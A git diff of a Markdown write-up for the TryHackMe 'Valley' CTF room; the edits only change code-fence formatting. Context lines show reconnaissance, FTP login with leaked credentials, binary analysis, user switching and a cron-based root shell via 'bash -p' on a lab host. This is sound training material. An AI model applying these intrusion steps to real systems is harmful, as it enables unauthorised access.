@@ -11,15 +11,15 @@ This Write-up/Walkthrough provides my process for the **Valley** *(THM)* CTF. He
 
 Let's start with the scan:
 
-```bash
+```
 nmap -p- --open --min-rate 5000 -sS -Pn -n -vvv 10.113.138.190
 
   22/tcp    open  ssh     syn-ack ttl 62
   80/tcp    open  http    syn-ack ttl 62
   37370/tcp open  unknown syn-ack ttl 62
+```
 
-###
-
+```
 nmap -p22,80,37370 -sV -sC 10.113.138.190
 
   PORT      STATE SERVICE VERSION
@@ -47,7 +47,7 @@ I found 3 ports opened:
 
 I usually use `whatweb` to get a better understanding of the website architecture.
 
-```bash
+```
 whatweb 10.113.138.190
 
   ERROR Opening: https://10.113.138.190 - Connection refused - connect(2) for "10.113.138.190" port 443
@@ -81,7 +81,7 @@ Explaining the main page source code:
 
 We'll take this one to our machine:
 
-```bash
+```
 wget http://valley.thm/pricing/note.txt
 ```
 
@@ -89,7 +89,7 @@ So we have two possibles users: "J" and "RP"
 
 I can't find anything else on the page right now, so let's dig a little deeper.
 
-```bash
+```
 gobuster dir -u http://valley.thm -w /usr/share/wordlists/dirb/common.txt -t 100 -r -q
 
   .htaccess            (Status: 403) [Size: 275]
@@ -108,9 +108,8 @@ There's something strange going on here. `gobuster` tells me that the `/static` 
 
 As yoy can see, there aren't 564 characters there. Let's take a closer look:
 
-```bash
-gobuster dir -u http://valley.thm/static -w /usr/share/wordlists/dirb/common.txt -t 100 -r -q -x php,html,txt,png,jpeg,jpg,
-❯ gobuster dir -u http://valley.thm/static -w /usr/share/wordlists/dirb/common.txt -t 100 -r -q -x php,html,txt,png,jpeg,jpg,json,yaml,env,js,css,map --xl 275
+```
+gobuster dir -u http://valley.thm/static -w /usr/share/wordlists/dirb/common.txt -t 100 -r -q -x php,html,txt,png,jpeg,jpg,json,yaml,env,js,css,map --xl 275
 
   00                   (Status: 200) [Size: 127]
   11                   (Status: 200) [Size: 627909]
@@ -168,7 +167,7 @@ At this point I'd like to remind you that loggin in via FTP is part of active re
 
 Hmmm... I tried loggin in as "Anonymous", and it didn't work, but I can't say I didn't know that, since it didn't show up as available in the service scan with nmap.
 
-```bash
+```
 ftp 10.113.138.190 37370
 
 Connected to 10.113.138.190.
@@ -182,7 +181,7 @@ ftp: Login failed
 
 Great, we use the credentials we found exposed in the JS script and managed to log in:
 
-```bash
+```
 ftp 10.113.138.190 37370
 Connected to 10.113.138.190.
 220 (vsFTPd 3.0.3)
@@ -265,7 +264,7 @@ Just out of curiosity, I tried entering those credentials into the path we found
 
 As I mentoned it, this is a Ubuntu focal:
 
-```bash
+```
 valleyDev@valley:~$ whoami
 valleyDev
 valleyDev@valley:~$ uname -a
@@ -286,7 +285,7 @@ Ok, I looked through the `.pncap` files and couldn't find them, but we were able
 
 If we go to the `/home` directory, we'll find a binary:
 
-```bash
+```
 valleyDev@valley:~$ cd /home/
 valleyDev@valley:/home$ ls -la
 total 752
@@ -302,7 +301,7 @@ valleyAuthenticator: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), s
 
 I tried to analyze it with `ltrace` but it is statically linked, so it throws an error:
 
-```bash
+```
 valleyDev@valley:/home$ ltrace ./valleyAuthenticator 
 Couldn't find .dynsym or .dynstr in "/proc/2101/exe"
 ```
@@ -311,7 +310,7 @@ To read more about this: https://stackoverflow.com/questions/26541049/ltrace-cou
 
 Let's try running it normally: 
 
-```bash
+```
 valleyDev@valley:/home$ ./valleyAuthenticator 
 Welcome to Valley Inc. Authenticator
 What is your username: USERNAME
@@ -327,7 +326,7 @@ Let's try with `strace`:
 
 Looking closely, we can see a user account named **valley** that also belongs to this machine. Since I'm not yet satisfied with this information, I need to examine this binary file more thoroughly, so I retrieve it using the SCP protocol.
 
-```bash
+```
 sudo scp valleyDev@10.113.138.190:/home/valleyAuthenticator .
 [sudo] contraseña para User: 
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
@@ -352,7 +351,7 @@ Once I found it, I tried to crack it with `john` but it didn't work, so we go to
 
 We test the credential we obtained and it works:
 
-```bash
+```
 valleyDev@valley:/home$ su valley
 Password: 
 valley@valley:/home$ whoami
@@ -382,7 +381,7 @@ Hands on:
 
 Once 1 minute has passed since the change (remember the cronjob), we can do the following:
 
-```bash
+```
 bash -p
 
 bash-5.0# whoami
